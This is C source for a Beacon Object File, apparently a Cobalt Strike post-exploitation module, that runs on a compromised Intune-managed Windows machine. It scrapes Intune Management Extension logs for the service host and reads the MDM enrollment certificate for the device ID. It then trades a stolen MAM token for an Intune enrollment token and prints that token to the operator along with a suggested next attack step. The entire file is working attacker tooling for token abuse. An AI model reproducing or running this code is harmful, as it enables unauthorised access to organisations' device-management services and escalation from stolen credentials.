/*
 * exchange BOF - Intune MAM-to-enrollment token exchange
 *
 * Auto-discovers the IWService host from IME logs and the device ID from
 * the MDM enrollment certificate, then exchanges a MAM token for an
 * enrollment token via the TokenRenewalService endpoint.
 *
 * Entry point: void go(char *args, int alen)
 *   arg0 (string) : MAM token (from askwam BOF)
 *   arg1 (string) : host override (optional, empty = auto-discover)
 */

#include "beacon.h"
#include "bofdefs.h"

#define MAX_RESPONSE (512 * 1024)
#define MAX_URL      4096

/* ----------------------------------------------------------------
 * Host discovery: scan IME logs for *.*.manage.microsoft.com
 * ---------------------------------------------------------------- */

static BOOL is_host_char(char c)
{
    return (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
           (c >= '0' && c <= '9') || c == '.' || c == '-';
}

/*
 * Scan a buffer for ".manage.microsoft.com", then walk backwards to
 * extract the full hostname. Requires at least two labels before the
 * suffix (e.g. "agents.amsub0502.manage.microsoft.com") so that bare
 * "manage.microsoft.com" and single-label prefixes like
 * "r.manage.microsoft.com" are skipped.
 * Returns 1 if found, writes the host into out (null-terminated).
 */
static int find_manage_host(const char *buf, DWORD len, const char *prefix,
                            char *out, int outsz)
{
    const char *suffix = ".manage.microsoft.com";
    DWORD sfxlen = (DWORD)bof_strlen(suffix);
    DWORD i;

    for (i = 0; i + sfxlen <= len; i++) {
        if (bof_strnicmp(buf + i, suffix, sfxlen) != 0)
            continue;

        /* Walk backwards to find the start of the hostname */
        int start = (int)i - 1;
        while (start >= 0 && is_host_char(buf[start]))
            start--;
        start++; /* first hostname character */

        if (start >= (int)i)
            continue;

        /* Count dots in the prefix before .manage.microsoft.com */
        int dots = 0;
        int k;
        for (k = start; k < (int)i; k++) {
            if (buf[k] == '.')
                dots++;
        }
        /* Require at least one dot: prefix.subdomain */
        if (dots < 1)
            continue;

        /* If a prefix filter is set, require the hostname to start with it */
        if (prefix) {
            DWORD plen = (DWORD)bof_strlen(prefix);
            if ((DWORD)(i - start) < plen ||
                bof_strnicmp(buf + start, prefix, plen) != 0)
                continue;
        }

        DWORD hostlen = (DWORD)(i + sfxlen - start);
        if (hostlen < (DWORD)outsz) {
            bof_memcpy(out, buf + start, hostlen);
            out[hostlen] = '\0';
            return 1;
        }
    }
    return 0;
}

/*
 * Derive fef.<region>.manage.microsoft.com from any
 * <service>.<region>.manage.microsoft.com host. The OAuth proxy runs
 * on agents.* but IWService runs on fef.* in the same region.
 */
static int derive_fef_host(const char *host, char *out, int outsz)
{
    const char *dot = bof_strchr(host, '.');
    if (!dot || !dot[1]) return 0;
    if (!bof_strstr(dot, ".manage.microsoft.com")) return 0;
    int rest_len = (int)bof_strlen(dot + 1);
    if (4 + rest_len >= outsz) return 0;
    bof_strcpy(out, "fef.");
    bof_strcat(out, dot + 1);
    return 1;
}

static int discover_host(char *out, int outsz, const char *prefix)
{
    WIN32_FIND_DATAW fd;
    HANDLE hFind = bof_FindFirstFileW(
        L"C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\*.log", &fd);
    if (hFind == INVALID_HANDLE_VALUE)
        return 0;

    wchar_t path[512];
    int found = 0;

    do {
        bof_snwprintf(path, 512,
            L"C:\\ProgramData\\Microsoft\\IntuneManagementExtension\\Logs\\%s",
            fd.cFileName);
        path[511] = L'\0';

        HANDLE hFile = bof_CreateFileW(path, GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE)
            continue;

        DWORD size = bof_GetFileSize(hFile, NULL);
        if (size == 0 || size == INVALID_FILE_SIZE || size > 16 * 1024 * 1024) {
            bof_CloseHandle(hFile);
            continue;
        }

        char *buf = (char *)bof_malloc(size);
        if (!buf) {
            bof_CloseHandle(hFile);
            continue;
        }

        DWORD bytesRead = 0, total = 0;
        while (total < size) {
            if (!bof_ReadFile(hFile, buf + total, size - total, &bytesRead, NULL) ||
                bytesRead == 0)
                break;
            total += bytesRead;
        }
        bof_CloseHandle(hFile);

        if (total > 0 && find_manage_host(buf, total, prefix, out, outsz))
            found = 1;

        bof_free(buf);
        if (found)
            break;
    } while (bof_FindNextFileW(hFind, &fd));

    bof_FindClose(hFind);
    return found;
}

/* ----------------------------------------------------------------
 * Device ID discovery: MDM enrollment cert in LocalMachine\My
 * ---------------------------------------------------------------- */

/* Case-insensitive wide string substring search */
static wchar_t *wcsstr_i(const wchar_t *haystack, const wchar_t *needle)
{
    size_t nlen = bof_wcslen(needle);
    if (nlen == 0) return (wchar_t *)haystack;
    for (; *haystack; haystack++) {
        if (bof_wcsnicmp(haystack, needle, nlen) == 0)
            return (wchar_t *)haystack;
    }
    return NULL;
}

static int discover_device_id(char *out, int outsz,
                              PCCERT_CONTEXT *out_cert, HCERTSTORE *out_store)
{
    HCERTSTORE hStore = bof_CertOpenStore(
        (LPCSTR)CERT_STORE_PROV_SYSTEM_W, 0, 0,
        CERT_SYSTEM_STORE_LOCAL_MACHINE | CERT_STORE_READONLY_FLAG, L"MY");
    if (!hStore) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] CertOpenStore(LocalMachine\\My) failed (err=%lu)\n",
            bof_GetLastError());
        return 0;
    }

    PCCERT_CONTEXT pCert = NULL;
    int found = 0;
    int cert_count = 0;

    while ((pCert = bof_CertFindCertificateInStore(
                hStore, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
                0, CERT_FIND_ANY, NULL, pCert)) != NULL) {
        cert_count++;
        wchar_t issuer[512];
        DWORD ilen = bof_CertGetNameStringW(pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE,
            CERT_NAME_ISSUER_FLAG, NULL, issuer, 512);
        if (ilen <= 1)
            continue;

        if (!wcsstr_i(issuer, L"Microsoft Intune MDM Device CA"))
            continue;

        wchar_t subject[256];
        DWORD slen = bof_CertGetNameStringW(pCert, CERT_NAME_SIMPLE_DISPLAY_TYPE,
            0, NULL, subject, 256);
        if (slen <= 1)
            continue;

        int nb = bof_WideCharToMultiByte(CP_UTF8, 0, subject, -1, out, outsz, NULL, NULL);
        if (nb > 0) {
            found = 1;
            break;
        }
    }

    if (!found)
        BeaconPrintf(CALLBACK_ERROR,
            "[-] No MDM enrollment cert found (%d certs in LocalMachine\\My)\n",
            cert_count);

    if (found && out_cert && out_store) {
        *out_cert = pCert;
        *out_store = hStore;
    } else {
        if (pCert)
            bof_CertFreeCertificateContext(pCert);
        bof_CertCloseStore(hStore, 0);
    }
    return found;
}

/* ----------------------------------------------------------------
 * WinHTTP GET helper - returns heap-allocated response body (caller frees)
 * ---------------------------------------------------------------- */

static char *http_get(const char *url, const char *token,
                      PCCERT_CONTEXT client_cert, int *out_status)
{
    int wlen = bof_MultiByteToWideChar(CP_UTF8, 0, url, -1, NULL, 0);
    if (wlen <= 0)
        return NULL;
    wchar_t *wurl = (wchar_t *)bof_malloc(wlen * sizeof(wchar_t));
    if (!wurl)
        return NULL;
    bof_MultiByteToWideChar(CP_UTF8, 0, url, -1, wurl, wlen);

    URL_COMPONENTSW uc;
    wchar_t whost[256] = {0};
    wchar_t wpath[2048] = {0};
    wchar_t wextra[1024] = {0};
    bof_memset(&uc, 0, sizeof(uc));
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = whost;
    uc.dwHostNameLength = 255;
    uc.lpszUrlPath = wpath;
    uc.dwUrlPathLength = 2047;
    uc.lpszExtraInfo = wextra;
    uc.dwExtraInfoLength = 1023;

    if (!bof_WinHttpCrackUrl(wurl, 0, 0, &uc)) {
        bof_free(wurl);
        return NULL;
    }
    bof_free(wurl);

    /* Append query string to path (WinHttpCrackUrl splits them) */
    if (wextra[0])
        bof_wcscat(wpath, wextra);

    HINTERNET hSession = bof_WinHttpOpen(L"Exchange/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession)
        return NULL;

    HINTERNET hConnect = bof_WinHttpConnect(hSession, whost, uc.nPort, 0);
    if (!hConnect) {
        bof_WinHttpCloseHandle(hSession);
        return NULL;
    }

    DWORD flags = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = bof_WinHttpOpenRequest(hConnect, L"GET", wpath,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hRequest) {
        bof_WinHttpCloseHandle(hConnect);
        bof_WinHttpCloseHandle(hSession);
        return NULL;
    }

    /* Attach client certificate for mTLS, or explicitly decline the
     * server's TLS CertificateRequest when no cert is available.
     * Without this, WinHttpSendRequest returns
     * ERROR_WINHTTP_CLIENT_AUTH_CERT_NEEDED (12044) and the request
     * fails before we ever see a response. */
    if (client_cert)
        bof_WinHttpSetOption(hRequest, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
            (LPVOID)client_cert, sizeof(CERT_CONTEXT));

    /* Build auth + accept headers */
    wchar_t hdrs[8192];
    bof_snwprintf(hdrs, 8192,
        L"Authorization: Bearer %S\r\nAccept: application/json\r\nAccept-Language: en-US\r\n",
        token);
    hdrs[8191] = L'\0';
    bof_WinHttpAddRequestHeaders(hRequest, hdrs, -1, WINHTTP_ADDREQ_FLAG_ADD);

    BOOL send_ok = bof_WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0);

    if (!send_ok && bof_GetLastError() == 12044) {
        /* Server sent a TLS CertificateRequest: supply the cert if
         * we have one, otherwise explicitly decline so WinHTTP
         * continues instead of aborting. */
        if (client_cert)
            bof_WinHttpSetOption(hRequest, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                (LPVOID)client_cert, sizeof(CERT_CONTEXT));
        else
            bof_WinHttpSetOption(hRequest, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
                NULL, 0);
        send_ok = bof_WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    }

    if (!send_ok || !bof_WinHttpReceiveResponse(hRequest, NULL)) {
        bof_WinHttpCloseHandle(hRequest);
        bof_WinHttpCloseHandle(hConnect);
        bof_WinHttpCloseHandle(hSession);
        return NULL;
    }

    /* Query status code */
    if (out_status) {
        DWORD status = 0, sz = sizeof(status);
        bof_WinHttpQueryHeaders(hRequest,
            WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            NULL, &status, &sz, NULL);
        *out_status = (int)status;
    }

    /* Read response body */
    char *resp = (char *)bof_malloc(MAX_RESPONSE);
    if (!resp) {
        bof_WinHttpCloseHandle(hRequest);
        bof_WinHttpCloseHandle(hConnect);
        bof_WinHttpCloseHandle(hSession);
        return NULL;
    }

    DWORD total = 0, avail, rd;
    while (bof_WinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        if (total + avail >= (DWORD)MAX_RESPONSE - 1)
            avail = MAX_RESPONSE - 1 - total;
        if (avail == 0)
            break;
        bof_WinHttpReadData(hRequest, resp + total, avail, &rd);
        total += rd;
        if (total >= (DWORD)MAX_RESPONSE - 1)
            break;
    }
    resp[total] = '\0';

    bof_WinHttpCloseHandle(hRequest);
    bof_WinHttpCloseHandle(hConnect);
    bof_WinHttpCloseHandle(hSession);
    return resp;
}

/* ----------------------------------------------------------------
 * JSON helpers: extract "Token" value from {"Result":{"Token":"..."}}
 * ---------------------------------------------------------------- */

static char *extract_token(const char *json)
{
    const char *key = "\"Token\"";
    const char *p = bof_strstr(json, key);
    if (!p)
        return NULL;

    p += bof_strlen(key);
    /* skip whitespace and colon */
    while (*p == ' ' || *p == '\t' || *p == '\n' || *p == '\r' || *p == ':')
        p++;
    if (*p != '"')
        return NULL;
    p++;

    const char *start = p;
    while (*p && *p != '"') {
        if (*p == '\\')
            p++;
        p++;
    }

    int len = (int)(p - start);
    if (len <= 0)
        return NULL;

    char *out = (char *)bof_malloc(len + 1);
    if (!out)
        return NULL;
    bof_memcpy(out, start, len);
    out[len] = '\0';
    return out;
}

/* ----------------------------------------------------------------
 * Entry point
 * ---------------------------------------------------------------- */

void go(char *args, int alen)
{
    datap parser;
    BeaconDataParse(&parser, args, alen);
    char *mam_token = BeaconDataExtract(&parser, NULL);
    char *host_override = BeaconDataExtract(&parser, NULL);

    if (!mam_token || bof_strlen(mam_token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No MAM token provided\n");
        return;
    }

    /* Discover or use provided host.
     * The OAuth proxy (token exchange) works on any regional host, but
     * IWService only runs on fef.* hosts. When fef.* is not in the logs,
     * derive it from whatever regional host we find (e.g. agents.amsub0502
     * → fef.amsub0502). Keep the original host for the exchange itself
     * (it works on agents.*) and print the derived fef host for IWService. */
    char host[256] = {0};
    char fef_host[256] = {0};
    if (host_override && bof_strlen(host_override) > 0) {
        bof_strncpy(host, host_override, 255);
        host[255] = '\0';
        bof_strncpy(fef_host, host, 255);
    } else {
        if (discover_host(host, sizeof(host), "fef.")) {
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Discovered host: %s\n", host);
            bof_strncpy(fef_host, host, 255);
        } else if (discover_host(host, sizeof(host), NULL)) {
            BeaconPrintf(CALLBACK_OUTPUT,
                "[*] Found regional host: %s\n", host);
            if (derive_fef_host(host, fef_host, sizeof(fef_host)))
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[*] Derived IWService host: %s\n", fef_host);
            else
                bof_strncpy(fef_host, host, 255);
        } else {
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Could not discover host from IME logs\n");
            return;
        }
    }

    /* Discover device ID (printed with the token at the end).
     * Not required for the exchange itself, just passed through. */
    char device_id[128] = {0};
    if (!discover_device_id(device_id, sizeof(device_id), NULL, NULL))
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] Device ID discovery failed (intune-apps will also fail)\n");

    /* Build the token exchange URL */
    char url[MAX_URL];
    bof_snprintf(url, MAX_URL,
        "https://%s/OAuth/StatelessOAuthService/OAuthProxy/?api-version=1.0",
        host);
    url[MAX_URL - 1] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT, "[*] GET %s\n", url);

    int status = 0;
    char *resp = http_get(url, mam_token, NULL, &status);
    if (!resp) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] HTTP request failed (WinHTTP err=%lu)\n", bof_GetLastError());
        return;
    }

    if (status != 200) {
        int show = (int)bof_strlen(resp);
        if (show > 300) show = 300;
        BeaconPrintf(CALLBACK_ERROR, "[-] HTTP %d: %.*s\n", status, show, resp);
        bof_free(resp);
        return;
    }

    char *token = extract_token(resp);
    bof_free(resp);

    if (!token || bof_strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No token found in response\n");
        if (token)
            bof_free(token);
        return;
    }

    /* Build the IWService URL for intune-apps using the fef host */
    char iwurl[MAX_URL];
    bof_snprintf(iwurl, MAX_URL,
        "https://%s/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService",
        fef_host);
    iwurl[MAX_URL - 1] = '\0';

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Enrollment token (%d chars):\n%s\n\n"
        "[*] IWService URL: %s\n"
        "[*] Device ID: %s\n\n"
        "[*] Next: intune-apps <token> list\n",
        (int)bof_strlen(token), token,
        iwurl, device_id);
    bof_free(token);
}
